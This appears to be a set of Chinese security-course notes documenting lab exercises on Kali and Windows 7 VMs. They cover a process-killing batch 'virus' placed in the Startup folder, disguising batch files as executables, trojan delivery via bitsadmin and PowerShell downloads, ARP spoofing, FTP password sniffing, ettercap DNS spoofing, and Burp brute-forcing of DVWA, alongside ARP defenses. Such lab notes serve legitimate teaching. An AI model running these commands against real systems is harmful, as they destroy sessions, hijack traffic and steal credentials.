  <img src="./%E8%AF%BE%E5%A0%82%E7%AC%94%E8%AE%B0.assets/image-20230803094823551.png" alt="image-20230803094823551" style="zoom:67%;" />

  运行效果

  <img src="./%E8%AF%BE%E5%A0%82%E7%AC%94%E8%AE%B0.assets/image-20230803094929983.png" alt="image-20230803094929983" style="zoom: 50%;" />

* 将无限弹出框文件放入启动文件夹里，实现开机自启无限弹出框

  ![image-20230803095105418](./%E8%AF%BE%E5%A0%82%E7%AC%94%E8%AE%B0.assets/image-20230803095105418.png)

  <img src="./%E8%AF%BE%E5%A0%82%E7%AC%94%E8%AE%B0.assets/image-20230803095137992.png" alt="image-20230803095137992" style="zoom: 50%;" />





## 蓝屏病毒

```
taskkill /f /fi "pid ne 1"
:: taskkill 杀进程
:: /f   强制终止
:: /fi  筛选进程、筛选出的查询任务
:: ne   除了编号为1的进程全部杀掉(若无ne则单独杀死进程1)
```

* 恢复：任务管理器>文件>运行新任务>cmd

  ```
  explorer
  ```

  或任务管理器>文件>运行新任务>浏览>windows>explorer.exe

* 管理员运行则蓝屏

* 实验过程

  

  ![image-20230803110521320](./%E8%AF%BE%E5%A0%82%E7%AC%94%E8%AE%B0.assets/image-20230803110521320.png)

  <img src="./%E8%AF%BE%E5%A0%82%E7%AC%94%E8%AE%B0.assets/image-20230803110535939.png" alt="image-20230803110535939" style="zoom:33%;" />

  恢复

  <img src="./%E8%AF%BE%E5%A0%82%E7%AC%94%E8%AE%B0.assets/image-20230803110803739.png" alt="image-20230803110803739" style="zoom:67%;" />

  <img src="./%E8%AF%BE%E5%A0%82%E7%AC%94%E8%AE%B0.assets/image-20230803110827134.png" alt="image-20230803110827134" style="zoom: 50%;" />

  或

  <img src="./%E8%AF%BE%E5%A0%82%E7%AC%94%E8%AE%B0.assets/image-20230803110925844.png" alt="image-20230803110925844" style="zoom:50%;" />

  ![image-20230803110947844](./%E8%AF%BE%E5%A0%82%E7%AC%94%E8%AE%B0.assets/image-20230803110947844.png)

* 以管理员身份运行效果

  ![image-20230803111022758](./%E8%AF%BE%E5%A0%82%E7%AC%94%E8%AE%B0.assets/image-20230803111022758.png)

  <img src="./%E8%AF%BE%E5%A0%82%E7%AC%94%E8%AE%B0.assets/image-20230803111116822.png" alt="image-20230803111116822" style="zoom:50%;" />

* 自制小病毒

  <img src="./%E8%AF%BE%E5%A0%82%E7%AC%94%E8%AE%B0.assets/image-20230803144445159.png" alt="image-20230803144445159" style="zoom:50%;" />

  运行效果

  

  <img src="./%E8%AF%BE%E5%A0%82%E7%AC%94%E8%AE%B0.assets/image-20230803144525137.png" alt="image-20230803144525137" style="zoom:50%;" />

  

# 将.bat文件伪装成.exe文件

1. 打开Bat To Exe Converter软件

2. 将批处理文件拖入软件中

3. 点击Convert

   <img src="./%E8%AF%BE%E5%A0%82%E7%AC%94%E8%AE%B0.assets/image-20230803150026255.png" alt="image-20230803150026255" style="zoom:50%;" />

4. 选择生成位置和文件名

   <img src="./%E8%AF%BE%E5%A0%82%E7%AC%94%E8%AE%B0.assets/image-20230803150110790.png" alt="image-20230803150110790" style="zoom:50%;" />

5. 生成成功

   ![image-20230803150147130](./%E8%AF%BE%E5%A0%82%E7%AC%94%E8%AE%B0.assets/image-20230803150147130.png)

6. 兼容性中设置成以管理员身份运行

   <img src="./%E8%AF%BE%E5%A0%82%E7%AC%94%E8%AE%B0.assets/image-20230803150325535.png" alt="image-20230803150325535" style="zoom:50%;" />

   ![image-20230803150343786](./%E8%AF%BE%E5%A0%82%E7%AC%94%E8%AE%B0.assets/image-20230803150343786.png)

7. 启动

   <img src="./%E8%AF%BE%E5%A0%82%E7%AC%94%E8%AE%B0.assets/image-20230803150403681.png" alt="image-20230803150403681" style="zoom:50%;" />

   







# 植入木马在Windows后进入shell，在启动项里写入bat

1. 将kali和Win7调整成同一网络模式

2. Kali生成木马

   ![image-20230803151110725](./%E8%AF%BE%E5%A0%82%E7%AC%94%E8%AE%B0.assets/image-20230803151110725.png)

3. kali开启http服务供win7下载

   ![image-20230803151204218](./%E8%AF%BE%E5%A0%82%E7%AC%94%E8%AE%B0.assets/image-20230803151204218.png)

4. kali配置并启动监听

   <img src="./%E8%AF%BE%E5%A0%82%E7%AC%94%E8%AE%B0.assets/image-20230803151500378.png" alt="image-20230803151500378" style="zoom:50%;" />

5. win7运行木马程序

   ![image-20230803151553289](./%E8%AF%BE%E5%A0%82%E7%AC%94%E8%AE%B0.assets/image-20230803151553289.png)

6. kali使用shell命令获取文件权限

   ![image-20230803151632590](./%E8%AF%BE%E5%A0%82%E7%AC%94%E8%AE%B0.assets/image-20230803151632590.png)

7. 进入启动文件夹

   ```
   cd C:\Users\zc\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup
   ```

   ![image-20230803152041663](./%E8%AF%BE%E5%A0%82%E7%AC%94%E8%AE%B0.assets/image-20230803152041663.png)

8. 生成病毒文件

   ![image-20230803152204208](./%E8%AF%BE%E5%A0%82%E7%AC%94%E8%AE%B0.assets/image-20230803152204208.png)

9. win7重启后无桌面

   <img src="./%E8%AF%BE%E5%A0%82%E7%AC%94%E8%AE%B0.assets/image-20230803152328785.png" alt="image-20230803152328785" style="zoom: 25%;" />

10. 恢复explorer程序，查看启动文件夹

    发现出现了刚刚在kali生成的.bat文件

    ![image-20230803152459204](./%E8%AF%BE%E5%A0%82%E7%AC%94%E8%AE%B0.assets/image-20230803152459204.png)

    



# 计算机通信原理

> * 同网段通信：    
>   1. 主机先查看自己的ARP表，如果有对应的ARP条目，则会利用表中MAC地址，直接对IP数据包进行封装，并将数据包转发给目标主机，若没有查找的相应的ARP表项，那么就会进行以下步骤
>   2. 主机A发送ARP Request广播报文，源MAC为自身的MAC，目的MAC为全F的广播MAC。Target IP为目的IP，Target MAC为全0的MAC。
>   3. 主机B收到ARP Request 报文，发现Target IP是自己接口的IP，会发送一个ARP Reply 报文，并通过ARP Request报文中的sender IP和sender MAC来更新自己的ARP表项。
>   4. 主机A收到ARP Reply 报文发现Target IP是自己的接口IP并且自身ARP缓存表中存在相应的ARP请求信息，并通过ARP Reply报文中的sender IP和sender MAC来更新自己的ARP表，同时将数据包进行二层封装后发送出去。
>
> * 跨网段通信：（源目IP不变，源目MAC逐跳变， ARP帮助路由打通下一跳）；
> * 注意
>   * ARP请求以广播发送、以单播回应
>   * 路由器隔离广播。每一个网段都是独立的广播域
>   * 跨越网段通信需要使用网关的mac地址

* 查看arp缓存

  ```
  arp -a
  ```

  



# 下载文件命令

* bitsadmin

  ```
  # 下载文件
  bitsadmin /transfer 任务名 下载地址 保存地址(最后需要加上保存文件的名字)
  # 如
  bitsadmin /transfer 下载任务 http://43.128.11.131/1.txt C:\Users\xunmi\Desktop\网安\下载文件.txt
  #
  bitsadmin /transfer hackingarticle http://192.168.191.131/mm.exe C:\Users\zc\Desktop\zc.exe
  ```

  ![image-20230803172955084](./%E8%AF%BE%E5%A0%82%E7%AC%94%E8%AE%B0.assets/image-20230803172955084.png)

* PowerShell

  1. cmd中启动powershell

     ```
     start powershell
     ```

  2. 输入

     ```
     $client = new-object System.Net.WebClient
     ```

  3.  1的位置填写文件下载地址，#2的位置填写下载的保存路径（注意一点要使用英文键盘的单引号）

     ```
     $client.DownloadFile('#1', '#2')
     :: $client.DownloadFile('http://192.168.191.131/mm.exe', 'C:\Users\LEGION\Desktop\mm2.exe')
     ```

     ![image-20230803200235820](./%E8%AF%BE%E5%A0%82%E7%AC%94%E8%AE%B0.assets/image-20230803200235820.png)

* Linux下载

  ```
  wget IP/文件
  ```

* 乱码
  ![img](./%E8%AF%BE%E5%A0%82%E7%AC%94%E8%AE%B0.assets/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2N4Y3NkbjY2Ng==,size_16,color_FFFFFF,t_70.png)

  使用命令

  ```bash
  chcp 65001
  ```

  > CHCP是一个计算机指令，能够显示或设置活动代码页编号。
  >
  > 代码页 描述：
  >
  > - 65001  UTF-8代码页
  > - 950 繁体中文
  > - 936 简体中文默认的GBK
  > - 437 MS-DOS美国英语







# ==第五天笔记==

# ARP断网攻击与防御

## 攻击

* **原理：将被攻击机器arp缓存表中的网关IP对应的MAC地址转换为kali的IP地址**

* Kali安装arp断网攻击工具

  ```
  apt-get install dsniff
  ```

* 输入攻击代码

  ```
  arpspoof -i eth0 -t 192.168.242.128 -r 192.168.242.2
  # -i后接网卡名称，可以用 IP a查看IP地址前对应的网卡名称
  # -t后接攻击目标的IP地址
  # -r后接攻击目标网关的IP地址
  ```

  <img src="./%E8%AF%BE%E5%A0%82%E7%AC%94%E8%AE%B0.assets/image-20230805093047155.png" alt="image-20230805093047155" style="zoom:67%;" />

  被攻击机

  <img src="./%E8%AF%BE%E5%A0%82%E7%AC%94%E8%AE%B0.assets/image-20230805093114515.png" alt="image-20230805093114515" style="zoom:67%;" />

  ![image-20230805095559005](./%E8%AF%BE%E5%A0%82%E7%AC%94%E8%AE%B0.assets/image-20230805095559005.png)

  被攻击机网关IP的MAC地址被替换成Kali的MAC

  ![image-20230805095549567](./%E8%AF%BE%E5%A0%82%E7%AC%94%E8%AE%B0.assets/image-20230805095549567.png)

  

  ***在使用kali在真实环境下攻击其他机器时其他机器的网关IP不是kali的mac地址是因为kali桥接的时候使用了真实机的网卡***

  

  > 地址解析协议，即ARP（Address Resolution Protocol），是根据IP地址获取物理地址的一个TCP/IP协议。主机发送信息时将包含目标IP地址的ARP请求广播到网络上的所有主机，并接收返回消息，以此确定目标的物理地址；收到返回消息后将该IP地址和物理地址存入本机ARP缓存中并保留一定时间，下次请求时直接查询ARP缓存以节约资源

  > ARPspoof原理：攻击者通过发送伪造的ARP响应包来欺骗网络上的其他设备。攻击者会发送一个ARP响应包，将自己的MAC地址伪装成目标设备的MAC地址。这样，其他设备就会将数据发送到攻击者的设备上。

*攻击局域网下真实设备时注意切换桥接模式*

## 防御

* arp静态绑定

  * 查看arp缓存

    ```
    arp -a
    ```

    ![image-20230805105634855](./%E8%AF%BE%E5%A0%82%E7%AC%94%E8%AE%B0.assets/image-20230805105634855.png)

  * 查看网卡信息（状态、id等）

    ```
    netsh i i show in
    ```

    完整代码

    ```
    netsh Interface ipv4 show interface
    ```

    ![image-20230805105702862](./%E8%AF%BE%E5%A0%82%E7%AC%94%E8%AE%B0.assets/image-20230805105702862.png)

  * 绑定网卡MAC(需要管理员权限)

    ```
    netsh -c "i i" add ne 网卡id 网关IP 网关MAC地址
    ```

  * 执行完后网关IP变成了静态

    <img src="./%E8%AF%BE%E5%A0%82%E7%AC%94%E8%AE%B0.assets/image-20230805110211462.png" alt="image-20230805110211462" style="zoom:67%;" />



* 删除arp静态绑定

  ```
  netsh -c "i i" delete ne 网卡id
  ::ne全称neighbors
  ```

  ![image-20230805110337404](./%E8%AF%BE%E5%A0%82%E7%AC%94%E8%AE%B0.assets/image-20230805110337404.png)

  ![image-20230805110412527](./%E8%AF%BE%E5%A0%82%E7%AC%94%E8%AE%B0.assets/image-20230805110412527.png)

* 360安全卫士搜索流量防火墙>局域网防护>自动绑定网关、ARP主动防御、IP冲突拦截打开

  <img src="./%E8%AF%BE%E5%A0%82%E7%AC%94%E8%AE%B0.assets/image-20230805104402978.png" alt="image-20230805104402978" style="zoom:67%;" />







# 通过ARP欺骗后抓取被攻击机访问的网站图片

* http (**80端口**) 非加密

  一般职业学院还在使用

* https (**443端口**) 加密,无法直接抓取

* 进行arp欺骗

  ```
  arpspoof -i eth0 -t 192.168.242.128 -r 192.168.242.2
  # -i后接网卡名称，可以用 IP a查看IP地址前对应的网卡名称
  # -t后接攻击目标的IP地址
  # -r后接攻击目标网关的IP地址
  ```

  ![image-20230805143056406](./%E8%AF%BE%E5%A0%82%E7%AC%94%E8%AE%B0.assets/image-20230805143056406.png)

  欺骗成功

  ![image-20230805143230971](./%E8%AF%BE%E5%A0%82%E7%AC%94%E8%AE%B0.assets/image-20230805143230971.png)

* 开启Linux内核转发

  ```
  echo 1 > /proc/sys/net/ipv4/ip_forward
  #将ip_forward赋值为1，可用cat /proc/sys/net/ipv4/ip_forward命令查看
  #值为1时开启内核转发，为0则不转发，被攻击机器无法正常上网
  ```

  ![image-20230805142856072](./%E8%AF%BE%E5%A0%82%E7%AC%94%E8%AE%B0.assets/image-20230805142856072.png)

  Win7正常访问网页

  <img src="./%E8%AF%BE%E5%A0%82%E7%AC%94%E8%AE%B0.assets/image-20230805143337241.png" alt="image-20230805143337241" style="zoom:67%;" />

* 使用driftent（不好用）

  * 抓取用户网页图片

    * 安装工具

    ```
    apt-get install driftnet
    ```

    * 使用命令

    ```
    driftnet -i eth0
    #eth0为使用的网卡
    ```

    ![image-20230805143419310](./%E8%AF%BE%E5%A0%82%E7%AC%94%E8%AE%B0.assets/image-20230805143419310.png)


  * Win7访问网页

    <img src="./%E8%AF%BE%E5%A0%82%E7%AC%94%E8%AE%B0.assets/image-20230805144011429.png" alt="image-20230805144011429" style="zoom: 33%;" />

  * kali的driftent抓取的图片

    ![image-20230805144059850](./%E8%AF%BE%E5%A0%82%E7%AC%94%E8%AE%B0.assets/image-20230805144059850.png)

* 使用wireshark抓包寻找图片

  * 打开wireshark监听数据包

    <img src="./%E8%AF%BE%E5%A0%82%E7%AC%94%E8%AE%B0.assets/image-20230805144340670.png" alt="image-20230805144340670" style="zoom:50%;" />

  * win7访问http网站（**非https**）

    <img src="./%E8%AF%BE%E5%A0%82%E7%AC%94%E8%AE%B0.assets/image-20230805144419853.png" alt="image-20230805144419853" style="zoom:50%;" />

  * 加载完后停止抓包，过滤http数据包

    过滤条件

    ```
    http||ip.scr==10.9.47.6
    #多个条件用||隔开
    源ip.src   目的ip.dst
    ```

    <img src="./%E8%AF%BE%E5%A0%82%E7%AC%94%E8%AE%B0.assets/image-20230805145621310.png" alt="image-20230805145621310" style="zoom: 33%;" />

  * 双击打开.jpg的http包

    右键复制链接

    <img src="./%E8%AF%BE%E5%A0%82%E7%AC%94%E8%AE%B0.assets/image-20230805150044761.png" alt="image-20230805150044761" style="zoom:50%;" />

  * 复制到浏览器打开，抓取图片成功

    <img src="./%E8%AF%BE%E5%A0%82%E7%AC%94%E8%AE%B0.assets/image-20230805150153921.png" alt="image-20230805150153921" style="zoom:50%;" />

  

  

  

* ***抓取不到图片***


* > 在现代浏览器中，大多数网站都已经启用了HTTPS协议，所以HTTP协议下传输敏感数据的情况变得越来越少。
  >
  > Driftnet工具不可以捕获HTTPS加密流量中的图片，因为HTTPS协议会使用SSL/TLS等安全协议对数据进行加密传输，从而使得Driftnet无法直接解析和获取加密流量中的图片数据。
  >
  > 要想在HTTPS场景下捕获图片数据，可以尝试使用其他工具，如SSLsplit等，来拦截并解密HTTPS流量，进而获取其中的图片信息。





# 任务

* 抓取此图片

  <img src="./%E8%AF%BE%E5%A0%82%E7%AC%94%E8%AE%B0.assets/image-20230805160131491.png" alt="image-20230805160131491" style="zoom:67%;" />

* 或者按F12点击检查，将鼠标移动到图片上

  <img src="./%E8%AF%BE%E5%A0%82%E7%AC%94%E8%AE%B0.assets/image-20230805164433341.png" alt="image-20230805164433341" style="zoom: 50%;" />

  

* 按F12打开显示图片路径

* 文件名显示在图片上

  <img src="./%E8%AF%BE%E5%A0%82%E7%AC%94%E8%AE%B0.assets/image-20230805160102721.png" alt="image-20230805160102721" style="zoom:50%;" />

  ![image-20230805160245316](./%E8%AF%BE%E5%A0%82%E7%AC%94%E8%AE%B0.assets/image-20230805160245316.png)

* 开启arpspoof，使用wireshark抓包，过滤http包，寻此名称图片

  <img src="./%E8%AF%BE%E5%A0%82%E7%AC%94%E8%AE%B0.assets/image-20230805161530340.png" alt="image-20230805161530340" style="zoom:67%;" />

* 复制图片URL到浏览器打开

  <img src="./%E8%AF%BE%E5%A0%82%E7%AC%94%E8%AE%B0.assets/image-20230805160532493.png" alt="image-20230805160532493" style="zoom:50%;" />





# Wireshark过滤

* 过滤jpg图片

  ```
  http.request.uri contains "jpg"
  ```

* 过滤源地址

  ```
  ip.src == IP
  ```

* 过滤目的地址

  ```
  ip.dst == IP
  ```

* 源地址**或**目的地址为某个IP

  ```
  ip.addr == IP
  ```

* 过滤uri中的请求信息(uri即url)

  ```
  http.request.uri contains "信息"
  ```

* 过滤出所有post请求

  ```
  http.request.method==”POST”
  ```

* 过滤端口

  ```
  tcp.port==443
  ```

* 过滤目标mac

  ```
  eth.dst==A0:00:00:04:C5:84
  ```

  





# FTP服务器的搭建

* 用户组创建

  <img src="./%E8%AF%BE%E5%A0%82%E7%AC%94%E8%AE%B0.assets/image-20230804150628762.png" alt="image-20230804150628762" style="zoom:50%;" />

* 添加分享文件夹

  <img src="./%E8%AF%BE%E5%A0%82%E7%AC%94%E8%AE%B0.assets/image-20230804150755233.png" alt="image-20230804150755233" style="zoom:50%;" />

* 权限设置

  <img src="./%E8%AF%BE%E5%A0%82%E7%AC%94%E8%AE%B0.assets/image-20230804150914349.png" alt="image-20230804150914349" style="zoom:50%;" />

* 将用户添加到组中

  <img src="./%E8%AF%BE%E5%A0%82%E7%AC%94%E8%AE%B0.assets/image-20230804151159517.png" alt="image-20230804151159517" style="zoom:67%;" />

  ![image-20230804151508948](./%E8%AF%BE%E5%A0%82%E7%AC%94%E8%AE%B0.assets/image-20230804151508948.png)

* 关闭防火墙

* 在另一台电脑使用ftp接收软件

* 输入ftp服务器的IP，用户名，密码即可登陆访问

* <img src="./%E8%AF%BE%E5%A0%82%E7%AC%94%E8%AE%B0.assets/image-20230804151950125.png" alt="image-20230804151950125" style="zoom:67%;" />

  



# ==第六天笔记==

# 抓取FTP密码（局域网内部）

* 开启Linux内核转发

  ```
  echo 1 > /proc/sys/net/ipv4/ip_forward
  #将ip_forward赋值为1，可用cat /proc/sys/net/ipv4/ip_forward命令查看
  #值为1时开启内核转发，为0则不转发，被攻击机器无法正常上网
  ```

  ![image-20230807112150728](./%E8%AF%BE%E5%A0%82%E7%AC%94%E8%AE%B0.assets/image-20230807112150728.png)

* 进行arp欺骗

  ```
  arpspoof -i eth0 -t 192.168.242.128 -r 192.168.242.2
  # -i后接网卡名称，可以用 IP a查看IP地址前对应的网卡名称
  # -t后接攻击目标的IP地址
  # -r后接攻击目标连接的ftp服务器（ftp在局域网内传输，不需要经过网关ftp请求直接经过路由器到达ftp服务器。kali需要伪装成ftp，将自己的mac地址对应为ftp服务器的mac地址将此信息发送给攻击目标，攻击目标在寻找ftp服务器ip对应的mac地址时，会将发送给服务器的数据包发送给kali）
  ```

  ![image-20230807112209769](./%E8%AF%BE%E5%A0%82%E7%AC%94%E8%AE%B0.assets/image-20230807112209769.png)

* 打开wireshark监听

* windows7访问ftp服务器并输入账号密码登录

  ![image-20230807112327391](./%E8%AF%BE%E5%A0%82%E7%AC%94%E8%AE%B0.assets/image-20230807112327391.png)

* wireshark筛选ftp流量，抓取到请求ftp的密码

  ![image-20230807112505854](./%E8%AF%BE%E5%A0%82%E7%AC%94%E8%AE%B0.assets/image-20230807112505854.png)








# DNS欺骗--钓鱼网站的攻击与防御

## DNS

> 域名解析系统，根据域名查出对应的 IP地址

<img src="./%E8%AF%BE%E5%A0%82%E7%AC%94%E8%AE%B0.assets/20180529183822818.png" alt="img" style="zoom:67%;" />

```
主机名.次级域名.顶级域名.根域名

baike.baidu.com.root
```

<img src="./%E8%AF%BE%E5%A0%82%E7%AC%94%E8%AE%B0.assets/20180529182740527.png" alt="img" style="zoom:67%;" />

| 分类           | 作用                                                         |
| -------------- | ------------------------------------------------------------ |
| 根域名服务器   | 最高层次的域名服务器，本地域名服务器解析不了的域名就会向其求助 |
| 顶级域名服务器 | 负责管理在该顶级域名服务器下注册的二级域名                   |
| 权限域名服务器 | 负责一个区的域名解析工作                                     |
| 本地域名服务器 | 当一个主机发出DNS查询请求时，这个查询请求首先发给本地域名服务器 |

> - 每个层的域名上都有自己的域名服务器，最顶层的是根域名服务器
> - **每一级域名服务器都知道下级域名服务器的IP地址**
> - 为了容灾, 每一级至少设置两个或以上的域名服务器

通过域名查询IP

```
nslookup www.baidu.com
```



## DNS查询原理

1. 缓存查找IP
2. 若缓存查找不到则在本机的hosts文件查找IP
3. 若本机的hosts文件查找不到则在DNS服务器查找IP



* 递归查询

  <img src="./%E8%AF%BE%E5%A0%82%E7%AC%94%E8%AE%B0.assets/image-20230802155549904.png" alt="image-20230802155549904" style="zoom: 50%;" />

* 迭代查询

  <img src="./%E8%AF%BE%E5%A0%82%E7%AC%94%E8%AE%B0.assets/image-20230802155511377.png" alt="image-20230802155511377" style="zoom: 50%;" />



## DNS欺骗步骤

* 在kali的home目录下创建index.html

  <img src="./%E8%AF%BE%E5%A0%82%E7%AC%94%E8%AE%B0.assets/image-20230807141905574.png" alt="image-20230807141905574" style="zoom:67%;" />

* 开启http服务

  ```
  python3 -m http.server 80
  ```

  

* 进入ettercap文件下

  ```
  cd /etc/ettercap/
  ```

  使用ls查看当前文件夹下的文件

  ![image-20230802172451352](./%E8%AF%BE%E5%A0%82%E7%AC%94%E8%AE%B0.assets/image-20230802172451352.png)

* 编辑etter.dns文件

  ```
  vi etter.dns
  ```

  按i键进入编辑模式

* 在文本的最后输入

  ```
  被欺骗者登录网站的域名 A kali的IP
  #攻击目标访问百度使将百度的网址对应到kali的IP
  ```

  <img src="./%E8%AF%BE%E5%A0%82%E7%AC%94%E8%AE%B0.assets/image-20230807142337887.png" alt="image-20230807142337887" style="zoom:67%;" />

* 输入完后按esc键，输入：wq保存并推出

  ```
  :wq
  ```

* 输入以下指令开启DNS欺骗工具

  ```
  ettercap -G
  ```

  <img src="./%E8%AF%BE%E5%A0%82%E7%AC%94%E8%AE%B0.assets/image-20230802173017157.png" alt="image-20230802173017157" style="zoom:67%;" />

* 选择网卡，点击对号

  ![image-20230802173225654](./%E8%AF%BE%E5%A0%82%E7%AC%94%E8%AE%B0.assets/image-20230802173225654.png)

* 点击三个点，选择Hosts>Scan for hosts

  ![image-20230802173325881](./%E8%AF%BE%E5%A0%82%E7%AC%94%E8%AE%B0.assets/image-20230802173325881.png)

* 待搜索后选择Hosts>Host list查看搜索出来的ip

  <img src="./%E8%AF%BE%E5%A0%82%E7%AC%94%E8%AE%B0.assets/image-20230802174526595.png" alt="image-20230802174526595" style="zoom:67%;" />

* 将网关加入目标1，将要攻击的主机加入到目标2

  <img src="./%E8%AF%BE%E5%A0%82%E7%AC%94%E8%AE%B0.assets/image-20230802174732144.png" alt="image-20230802174732144" style="zoom:67%;" />

* 启动ARP毒化

  <img src="./%E8%AF%BE%E5%A0%82%E7%AC%94%E8%AE%B0.assets/image-20230802174825417.png" alt="image-20230802174825417" style="zoom:67%;" />

* OK

  ![image-20230802174852897](./%E8%AF%BE%E5%A0%82%E7%AC%94%E8%AE%B0.assets/image-20230802174852897.png)

* 启动DNS欺骗：点击三个点>Plugins>Manage plugins

  ![image-20230802174944571](./%E8%AF%BE%E5%A0%82%E7%AC%94%E8%AE%B0.assets/image-20230802174944571.png)

![image-20230802175014070](./%E8%AF%BE%E5%A0%82%E7%AC%94%E8%AE%B0.assets/image-20230802175014070.png)

* 双击dns spoof

  <img src="./%E8%AF%BE%E5%A0%82%E7%AC%94%E8%AE%B0.assets/image-20230802175113571.png" alt="image-20230802175113571" style="zoom:67%;" />


* Win7访问www.baidu.com

  <img src="./%E8%AF%BE%E5%A0%82%E7%AC%94%E8%AE%B0.assets/image-20230807143111550.png" alt="image-20230807143111550" style="zoom:80%;" />

* DNS欺骗成功



# DVWA靶场搭建

1. 安装微软环境

   ![image-20230803203126116](./%E8%AF%BE%E5%A0%82%E7%AC%94%E8%AE%B0.assets/image-20230803203126116.png)

2. 安装phpstudy，启动服务

   > phpstudy集成了mysql、apache（代理）和php

   <img src="./%E8%AF%BE%E5%A0%82%E7%AC%94%E8%AE%B0.assets/image-20230803203510055.png" alt="image-20230803203510055" style="zoom:67%;" />

3. 访问127.0.0.1，环境成功搭建

   <img src="./%E8%AF%BE%E5%A0%82%E7%AC%94%E8%AE%B0.assets/image-20230803203640328.png" alt="image-20230803203640328" style="zoom:50%;" />

4. 部署DVWA网站

   * 将解压后文件夹内的文件夹名改为dvwa并复制到phpstudy的WWW目录下

     ![image-20230803203908665](./%E8%AF%BE%E5%A0%82%E7%AC%94%E8%AE%B0.assets/image-20230803203908665.png)

     <img src="./%E8%AF%BE%E5%A0%82%E7%AC%94%E8%AE%B0.assets/image-20230803204102305.png" alt="image-20230803204102305" style="zoom: 67%;" />

5. 打开网站127.0.0.1/dvwa

   <img src="./%E8%AF%BE%E5%A0%82%E7%AC%94%E8%AE%B0.assets/image-20230803204242614.png" alt="image-20230803204242614" style="zoom:67%;" />

   报错

   进入\phpStudy\WWW\dvwa\config目录，删除.dist后缀

   ![image-20230803204358810](./%E8%AF%BE%E5%A0%82%E7%AC%94%E8%AE%B0.assets/image-20230803204358810.png)

6. 刷新页面

   <img src="./%E8%AF%BE%E5%A0%82%E7%AC%94%E8%AE%B0.assets/image-20230803204509780.png" alt="image-20230803204509780" style="zoom:67%;" />

   网站搭建成功

7. 修改报红的地方

   <img src="./%E8%AF%BE%E5%A0%82%E7%AC%94%E8%AE%B0.assets/image-20230803204707660.png" alt="image-20230803204707660" style="zoom:67%;" />

   * 打开php.ini配置文件

     <img src="./%E8%AF%BE%E5%A0%82%E7%AC%94%E8%AE%B0.assets/image-20230803204923804.png" alt="image-20230803204923804" style="zoom:67%;" />

   * 找到报红的选项，将Off改成On

     <img src="./%E8%AF%BE%E5%A0%82%E7%AC%94%E8%AE%B0.assets/image-20230803205132838.png" alt="image-20230803205132838" style="zoom:67%;" />

     <img src="./%E8%AF%BE%E5%A0%82%E7%AC%94%E8%AE%B0.assets/image-20230803205205712.png" alt="image-20230803205205712" style="zoom:67%;" />

   * 重启phpstudy

8. 修改数据库密码

   进入进入\phpStudy\WWW\dvwa\config目录打开config.inc.php文件

   更改引号内密码为root

   <img src="./%E8%AF%BE%E5%A0%82%E7%AC%94%E8%AE%B0.assets/image-20230803205820767.png" alt="image-20230803205820767" style="zoom:67%;" />

9. 点击create/Reset Database

   ![image-20230803210541527](./%E8%AF%BE%E5%A0%82%E7%AC%94%E8%AE%B0.assets/image-20230803210541527.png)

   <img src="./%E8%AF%BE%E5%A0%82%E7%AC%94%E8%AE%B0.assets/image-20230803210753976.png" alt="image-20230803210753976" style="zoom:67%;" />

   默认用户名admin  密码password

   登陆成功

   <img src="./%E8%AF%BE%E5%A0%82%E7%AC%94%E8%AE%B0.assets/image-20230807162033725.png" alt="image-20230807162033725" style="zoom: 50%;" />







# ==第七天笔记==

# DVWA/Web密码爆破



### low

* 关闭防火墙，否则127.0.0.1/dvwa可能访问不了

* 使用kali登录目标网站

  <img src="./%E8%AF%BE%E5%A0%82%E7%AC%94%E8%AE%B0.assets/image-20230803212248370.png" alt="image-20230803212248370" style="zoom:50%;" />

* 登录，安全等级选择low

  <img src="./%E8%AF%BE%E5%A0%82%E7%AC%94%E8%AE%B0.assets/image-20230803212431165.png" alt="image-20230803212431165" style="zoom:67%;" />

* 点击此处登录进行爆破

  <img src="./%E8%AF%BE%E5%A0%82%E7%AC%94%E8%AE%B0.assets/image-20230803212513180.png" alt="image-20230803212513180" style="zoom:50%;" />

* 点击FocyProcy>option

  ![image-20230803212803140](./%E8%AF%BE%E5%A0%82%E7%AC%94%E8%AE%B0.assets/image-20230803212803140.png)

* 添加

  <img src="./%E8%AF%BE%E5%A0%82%E7%AC%94%E8%AE%B0.assets/image-20230803212921974.png" alt="image-20230803212921974" style="zoom:50%;" />

* 添加127.0.0.1/8080

  <img src="./%E8%AF%BE%E5%A0%82%E7%AC%94%E8%AE%B0.assets/image-20230803212956407.png" alt="image-20230803212956407" style="zoom: 50%;" />

* 打开bp（burpsuite）

  在Proxy>Options中选择127.0.0.1：8080

* 开启bp的拦截

  ![image-20230803213643540](./%E8%AF%BE%E5%A0%82%E7%AC%94%E8%AE%B0.assets/image-20230803213643540.png)

* 打开浏览器代理

  <img src="./%E8%AF%BE%E5%A0%82%E7%AC%94%E8%AE%B0.assets/image-20230803213742665.png" alt="image-20230803213742665" style="zoom:50%;" />

  输入用户名密码点击登录

  ![image-20230803213820920](./%E8%AF%BE%E5%A0%82%E7%AC%94%E8%AE%B0.assets/image-20230803213820920.png)

* 弹出拦截的报文

  <img src="./%E8%AF%BE%E5%A0%82%E7%AC%94%E8%AE%B0.assets/image-20230803213854673.png" alt="image-20230803213854673" style="zoom:50%;" />

* 右键，将报文发送到测试器中

  ![image-20230803214125133](./%E8%AF%BE%E5%A0%82%E7%AC%94%E8%AE%B0.assets/image-20230803214125133.png)

* 在测试器(Intruder)中

  点击清除$

  ![image-20230803214425712](./%E8%AF%BE%E5%A0%82%E7%AC%94%E8%AE%B0.assets/image-20230803214425712.png)

* 选中要爆破的地方点击add$==(将刚刚输入的密码用$$括起来)==

  <img src="./%E8%AF%BE%E5%A0%82%E7%AC%94%E8%AE%B0.assets/image-20230803214556123.png" alt="image-20230803214556123" style="zoom: 67%;" />

* 在payloads中选择简单清单的爆破方式

  <img src="./%E8%AF%BE%E5%A0%82%E7%AC%94%E8%AE%B0.assets/image-20230803214848670.png" alt="image-20230803214848670" style="zoom:50%;" />

* 选择密码字典

  <img src="./%E8%AF%BE%E5%A0%82%E7%AC%94%E8%AE%B0.assets/image-20230803215918779.png" alt="image-20230803215918779" style="zoom:50%;" />

* 点击start attack开始爆破

  <img src="./%E8%AF%BE%E5%A0%82%E7%AC%94%E8%AE%B0.assets/image-20230803220022722.png" alt="image-20230803220022722" style="zoom:50%;" />

* 找出length不同的条目，该条目中的密码即登陆密码（登陆页面和爆出密码页面长度不同）

